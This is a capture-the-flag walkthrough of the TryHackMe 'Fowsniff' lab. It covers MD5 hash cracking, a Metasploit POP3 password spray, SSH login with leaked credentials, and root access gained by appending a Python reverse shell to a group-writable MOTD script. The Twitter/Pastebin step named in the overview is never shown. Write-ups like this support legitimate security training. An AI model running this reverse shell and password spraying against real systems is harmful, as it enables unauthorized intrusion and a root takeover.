# TryHackMe — Fowsniff Corp (Boot2Root)

## Overview
Full box compromise driven entirely by OSINT and credential reuse: a breach notice on the web server → a hijacked corporate Twitter account → a public Pastebin dump of `username:md5` pairs → cracked MD5 hashes → POP3 brute force confirming one still-valid mailbox → an internal email leaking a temporary password → SSH as that user → a group-writable script executed by the MOTD as root → root reverse shell.

## Recon

### Nmap
```
nmap -sC -sV -oN fowsniff_initial <target-ip>
nmap -p- --min-rate 1000 <target-ip>
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |
| 110/tcp | pop3 | Dovecot pop3d |
| 143/tcp | imap | Dovecot imapd |

Two mail services (POP3 + IMAP) alongside a web server is the shape of the whole box: the web server tells the story, the mail server holds the first foothold.

## Enumeration — Web Server

`robots.txt` only contained `Disallow: /` — no hidden paths, a dead end.

The homepage was the real lead. Fowsniff Corp posted a breach notice stating:
- Their internal systems were breached, exposing **employee usernames and passwords**.
- Their official Twitter account **@fowsniffcorp** was hijacked by the attackers, who threatened to release data through it.

That points OSINT straight at the Twitter account.

## Cracking the MD5 Hashes

Split the dump into two files:
```
cut -d '@' -f1 leaked.txt > users.txt
cut -d ':' -f2 leaked.txt > hashes.txt
```

These are unsalted MD5s — they fall instantly to online lookups (hashkiller.io / crackstation.net) or John locally:
```
john --format=raw-md5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.txt
john --format=raw-md5 --show hashes.txt
```

Most hashes cracked to weak passwords. The one that matters:

| Username | Password |
|----------|----------|
| mauer | mailcall |
| mustikka | bilance |
| tegel | apples01 |
| baksteen | skyler22 |
| **seina** | **scoobydoo2** |

Save the cracked plaintexts to `passwords.txt` for the brute force.

## POP3 Brute Force — Metasploit

The breach notice said passwords were reset, so most leaked credentials are dead. Spray the cracked passwords across every username against POP3 to find any mailbox still using its old password:

```
msfconsole -q
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run
```

One hit:
```
[+] <target-ip>:110 - Success: 'seina:scoobydoo2'
```

**seina's email password: `scoobydoo2`**

## Reading the Mailbox — POP3

Connected manually and read her messages:
```
nc <target-ip> 110
USER seina
PASS scoobydoo2
LIST
RETR 1
RETR 2
```

The inbox held an internal IT email about the breach. It announced that all accounts had been reset to a shared temporary password and instructed staff to log in and change it:

**Temporary password: `S1ck3nBluff+secondsite`**

The email was sent by the IT team member with the username **baksteen**. Per the message, that temporary password is the current login for his account.

## Foothold — SSH as baksteen

```
ssh baksteen@<target-ip>
# password: S1ck3nBluff+secondsite
```

The SSH banner shows the Fowsniff Corp ASCII art — important for the next step, because that banner is generated by the MOTD system at login.

## Privilege Escalation — Group-Writable MOTD Script

### Enumeration
```
id
# uid=1003(baksteen) gid=1003(baksteen) groups=1003(baksteen),100(users)
```

baksteen is in the **users** group. Hunt for anything that group can write:
```
find / -group users -type f 2>/dev/null
# /opt/cube/cube.sh
```

`cube.sh` is writable by the `users` group. It prints the ASCII banner — and it's called by one of the scripts in `/etc/update-motd.d/`, which run **as root** every time a user logs in over SSH (that's why we saw the Fowsniff banner on connect).

So: a script we can edit, triggered automatically by root on every SSH login. That's the whole privesc.

### Injecting the reverse shell

Append a reverse shell to `cube.sh` (keep the original banner code above it):
```
echo 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\''' >> /opt/cube/cube.sh
```

### Trigger it

Start a listener on the attacker box:
```
nc -lvnp 1234
```

Then open a **second** SSH session as baksteen (or log out and back in). The MOTD fires `cube.sh` as root, and the listener catches a root shell:
```
# on the listener:
id
# uid=0(root) gid=0(root) groups=0(root)
```

Stabilise and grab the root proof:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /root/*.txt
ls -la /root
```

Root on the box. 🎩

## Key Takeaways
- The web server was pure narrative — no exploit, just a breach notice pointing at the attack path. Read the site before you fuzz it.
- OSINT is a real step: a hijacked Twitter account → a Pastebin dump is exactly how credential leaks surface in the wild.
- Unsalted MD5 of weak passwords = instant cracks. Salting alone would have blunted this entire chain.
- After a "we reset all passwords" notice, don't assume every leaked credential is dead — spray them and let the service tell you which mailbox still works.
- Never ship a shared temporary password over email, and never let it double as an SSH login.
- The core privesc lesson: a low-priv group having write access to a script that root executes (here via `update-motd.d`) is game over. MOTD scripts run as root on every login — they must not be writable by anyone but root.
- `find / -group <group> -type f` and `find / -perm -o+w` are the first things to run after any foothold.
